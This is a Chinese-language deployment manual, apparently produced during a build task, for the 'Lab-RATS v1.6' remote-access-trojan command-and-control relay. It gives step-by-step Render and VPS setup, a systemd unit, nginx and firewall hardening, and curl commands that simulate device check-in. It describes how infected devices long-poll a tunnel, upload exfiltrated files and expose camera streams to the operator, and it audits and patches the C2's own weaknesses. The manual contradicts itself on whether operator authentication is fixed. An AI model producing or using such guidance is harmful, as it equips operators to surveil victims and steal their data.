# Lab-RATS v1.6 — C2 服务端部署手册（deploy/C2_DEPLOY.md）

> 适用对象：`c2-server/server.js`（Node/Express C2 中继，IPv4 出站路径）。
> 生成时间：2026-11-12。配套文件：`.env.example`、`render.yaml.fixed`、`VERIFY_LOG.md`、`npm-audit-report.txt`。

---

## 0. 架构速览（验收结论）

两条完全不同的控制链路，不要混淆：

| 路径 | 谁在监听 | 端口 | 用途 | 认证 |
|---|---|---|---|---|
| **Node 中继（本手册）** | `c2-server/server.js`（渲染用） | `process.env.PORT \|\| 10000`，绑定 `0.0.0.0` | 面板 + 设备 check-in + 长轮询隧道 `/proxy/*` + exfil 保险库 | `/login` 签发随机 64hex 会话 token（30 分钟）；操作员路由已受保护（已修补，见 PATCH_NOTES.md） |
| **IPv6 直连（App 内嵌面板）** | App 内 `FirebaseConfig extends NanoHTTPD`，`Router.java`/`AuthController.java` 分发 | `9191`（`DEFAULT_PORT`） | 直接连目标设备面板 | PBKDF2-SHA256 校验 + `token=UUID` cookie（`PasswordHasher.java`） |

- 根目录 `server.js` 只有一行 `require('./c2-server/server.js')`；根 `package.json` 的 `start` 是 `node c2-server/server.js`。**两者是同一个服务、两个入口**——同时启动会端口冲突（EADDRINUSE），部署时任选其一（Render 用 `c2-server/` 目录）。
- 设备端 `C2_Tunnel.java` 从 `BuildConfig.WEBHOOK_URL` 派生 base URL，2 个 worker 长轮询 `GET {base}/tunnel-poll?deviceId=...`（10s 超时），收到 `{type:'request'}` 后把请求重放到本机 NanoHTTPD `127.0.0.1:9191`，再把响应 base64 POST 回 `{base}/tunnel-response`。服务端 catch-all `/proxy/*` 是操作员入口，25s 无响应返回 504。
- 设备注册：`GET /checkin`（或 `GET /?ip=&model=`）、文件回传 `POST /upload`（multipart，手工解析）。设备数据存内存 Map，落盘 `c2-server/devices.json`；文件落 `c2-server/uploads/`，经 `/c2/downloads/` 静态提供下载。
- 认证（服务端，已修补）：`POST /login` 用 `timingSafeEqual` 比较 `C2_PASSWORD`（无默认值：未设置或等于 `admin1337` 时启动即退出），成功签发随机 64hex 会话 token（内存 Map、30 分钟过期）；`GET /`、`/api/*`、`/proxy/*`、`/c2/downloads` 均需有效会话；`/checkin`、`/tunnel-poll`、`/tunnel-response`、`/upload` 需 `X-Device-Secret` 头与 `DEVICE_SECRET` 环境变量一致。详见 deploy/PATCH_NOTES.md 与 VERIFY_LOG.md §8。

---

## A. Render.com 免费部署

1. Fork 仓库，新建 **Web Service** → 连接 fork 后的 Lab-RATS-v1.6 仓库。
2. 推荐直接用蓝打印文件 `deploy/render.yaml.fixed`（已含环境变量与健康检查）；手工配置则按下表：
   - Root Directory：`c2-server`
   - Build Command：`npm install --omit=dev`
   - Start Command：`npm start`
   - Plan：Free
3. **环境变量（必做）**：`C2_PASSWORD` = 强口令（≥16 字符）、`DEVICE_SECRET` = 设备链路共享密钥（与 APK 构建时 `local.properties` 里的 `DEVICE_SECRET` 一致）。两者缺失时服务拒绝启动。
   平台会自动注入 `PORT`（服务端读取，无需自设）。
4. Deploy 后复制服务 URL（形如 `https://labrats-xxxx.onrender.com`），填入 APK Builder 的 “C2 Webhook URL” 提示符（对应 `BuildConfig.WEBHOOK_URL`）。
5. 验证：
   ```bash
   curl -s https://labrats-xxxx.onrender.com/          # 200 面板 HTML
   curl -s -X POST -d "password=你的口令" -i https://labrats-xxxx.onrender.com/login | head -5
   curl -s "https://labrats-xxxx.onrender.com/checkin?ip=1.2.3.4&model=Pixel&brand=Google&deviceId=TEST01"
   ```
6. 免费版注意：实例 **15 分钟无流量会休眠**，首次访问冷启动 30–60s；设备端 50ms 重试会自动恢复长轮询，无需人工干预。磁盘是**临时卷**，`uploads/` 里回传的文件会随重启丢失，收到后应立即下载。

---

## B. 自建 VPS（Ubuntu 22.04/24.04 + Node + systemd）

```bash
# 1) 安装 Node LTS（NodeSource，20.x/22.x/26.x 均可，要求 >=18）
curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
sudo apt-get install -y nodejs git
node -v && npm -v

# 2) 拉取并安装依赖（只需 c2-server 目录）
sudo mkdir -p /opt/lab-rats && sudo chown $USER /opt/lab-rats
git clone https://github.com/<your-fork>/Lab-RATS-v1.6.git /opt/lab-rats
cd /opt/lab-rats/c2-server && npm install --omit=dev

# 3) 环境文件（覆盖默认口令，必做）
sudo tee /etc/labrats-c2.env <<'EOF'
PORT=10000
C2_PASSWORD=CHANGE_ME_STRONG_PASSPHRASE
NODE_ENV=production
EOF
sudo chmod 600 /etc/labrats-c2.env

# 4) systemd 服务单元
sudo tee /etc/systemd/system/labrats-c2.service <<'EOF'
[Unit]
Description=Lab-RATS C2 Relay (Node)
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/opt/lab-rats/c2-server
EnvironmentFile=/etc/labrats-c2.env
ExecStart=/usr/bin/node server.js
Restart=always
RestartSec=5
# 加固（可选但推荐）
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=full
ReadWritePaths=/opt/lab-rats/c2-server/uploads

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now labrats-c2
sudo systemctl status labrats-c2 --no-pager
```

> `uploads/` 与 `devices.json` 需要服务账户写权限；若用 root 运行可去掉 ProtectSystem/ReadWritePaths 段。

---

## C. 防火墙 / 反向代理注意点（面板绑定 0.0.0.0）

服务端 `app.listen(PORT, '0.0.0.0')`，**公网 VPS 上等于直接暴露**，建议用 nginx 做 TLS 终结 + 收敛攻击面：

```nginx
# /etc/nginx/sites-available/labrats-c2
server {
    listen 80;
    server_name c2.example.com;
    return 301 https://$host$request_uri;
}
server {
    listen 443 ssl;
    server_name c2.example.com;
    ssl_certificate     /etc/letsencrypt/live/c2.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;

    client_max_body_size 64m;   # 与 express 50mb 上限匹配

    location / {
        proxy_pass http://127.0.0.1:10000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 30s;   # 长轮询/代理响应最长 25s，略放大
    }
}
```

防火墙（ufw）：

```bash
sudo ufw allow 22/tcp        # SSH
sudo ufw allow 80,443/tcp    # nginx
# 不要对公网开放 10000/tcp —— 面板绑定 0.0.0.0，直开等于把无鉴权面板暴露出去
sudo ufw enable
```

要点：

1. **不要把 10000 直接暴露公网**。当前版本操作员路由无强制鉴权（§7），务必只经 443 的反代访问，并在 nginx 层加 HTTP Basic Auth 或 IP 白名单（`allow 1.2.3.4; deny all;`）作为补偿控制。
2. `/checkin`、`/upload`、`/tunnel-poll`、`/tunnel-response` 设计上无认证（设备回连用），无法单独收紧时不建议改变路径语义；但可在 nginx 对 `/login` 加 `limit_req` 防口令爆破。
3. TLS 下建议给登录 cookie 补 `Secure` 属性（需改 server.js 第 183 行），避免回退 HTTP 时被嗅探。
4. Render 平台已自动终止 TLS（免费 *.onrender.com），无需自配证书。

---

## 7. 认证与安全现状（验收结论）

> 以下为**修补前**的验收发现，作为历史记录保留。全部高危项已在修补阶段修复并实测（见 [PATCH_NOTES.md](deploy/PATCH_NOTES.md) 与 [VERIFY_LOG.md](deploy/VERIFY_LOG.md) §8）：
> ① 鉴权中间件已启用（随机 64hex 会话 token，30 分钟过期）→ 已修复；
> ② `admin1337` 兜底已删除（缺失即拒绝启动）→ 已修复；
> ③ 常量 token `AUTH_OK_1337` 已移除 → 已修复；
> ④ 面板字段已 HTML 转义 → 已修复；
> ⑤ 设备端点已加 `X-Device-Secret` → 已修复；
> ⑥ `/login` 已加速率限制（5 次失败锁 10 分钟）→ 已修复；
> ⑦ `/upload` 已加 50MB 上限 + 扩展名白名单 → 已修复；
> ⑧ `/c2/downloads` 已改为会话受控下载 → 已修复。

**高危（必须改再上线）**

1. **鉴权旁路**：`server.js:376-379` 的 auth guard 中间件直接 `next()`，`/`、`/proxy/*`、`/api/rename-device`、`/api/delete-exfil`、`/c2/downloads/*` 全部无需 cookie 即可访问。登录页形同虚设（本机已验证：无 cookie 直接拿到面板与命令代理，见 VERIFY_LOG.md §6）。
2. **默认口令兜底**：`C2_PASSWORD` 未设置时回退 `admin1337`（`server.js:9`），且 repo 自带 `render.yaml` 未声明该环境变量 → 按默认配置部署即弱口令。
3. **会话 token 是常量**：cookie 值 `AUTH_OK_1337` 写死在代码里（`server.js:121`），任何人都能自造 cookie，即便启用中间件也挡不住。
4. **存储型 XSS**：面板把 check-in 上报的 `deviceId/brand/model/alias` 未转义直接拼进 HTML（`server.js:437-467`）；`/checkin` 无认证，任意人可以注入 `<script>` 打操作员浏览器。
5. **设备身份可冒用**：`/checkin`、`/tunnel-poll`、`/tunnel-response` 无任何设备凭据。猜到 `deviceId` 即可冒领长轮询命令（截获面板下发的请求）或伪造回包。
6. **无速率限制**：`/login` 可无限爆破（弱口令下几秒即破）。

**中低危**

7. `/upload` 手工解析 multipart，**无大小上限**（express 50mb 限制只对 JSON/urlencoded 生效），可塞满 `uploads/` 磁盘。
8. `/c2/downloads/` 无鉴权静态目录：exfil 文件名可预测（`时间戳_原名`），可被遍历下载。
9. `/login` 失败页把 `err.message` 未转义回显（低危反射）。
10. 时区硬编码 `America/Toronto`（`formatTime()`），`TZ` 环境变量无效；cookie 缺 `Secure`。
11. `GET /login` 未注册 GET 路由，会落入 `/proxy/*` catch-all，25s 后返回 504（体验缺陷，非漏洞）。

**加固建议（最小改动）**：恢复鉴权中间件（校验 cookie 并改为随机 token + 服务端存储）；`C2_PASSWORD` 走哈希/常量时间比较并强制覆盖默认值；面板 HTML 转义设备字段；`/upload` 加 Content-Length 上限；下载与操作 API 强制 cookie。

**App 侧（IPv6 直连路径，对照）**：`PasswordHasher.java` 用 PBKDF2WithHmacSHA256（10000 次、256bit、16B salt）验证，`AuthController` 登录后发随机 UUID token cookie（Max-Age 1 年）；未登录仅可访问 `/c2/` 静态资产与登录页，`/camera/` 流强制 token（127.0.0.1 来源豁免）。默认口令同样为 `admin1337`，首登后务必改（docs/12 §10 有同样要求）。

---

## 8. 交付文件清单

| 文件 | 说明 |
|---|---|
| `deploy/C2_DEPLOY.md` | 本手册 |
| `deploy/.env.example` | 环境变量模板（标注哪些被服务端实际消费） |
| `deploy/render.yaml.fixed` | 修正后的 Render 蓝打印（含 C2_PASSWORD 与健康检查） |
| `deploy/VERIFY_LOG.md` | 本地运行验证记录（Windows，Node v26.13.1） |
| `deploy/npm-audit-report.txt` | c2-server 与根目录 npm audit 漏洞清单 |
| `deploy/tunnel-sim.js` | 设备端长轮询模拟器（E2E 验证用） |
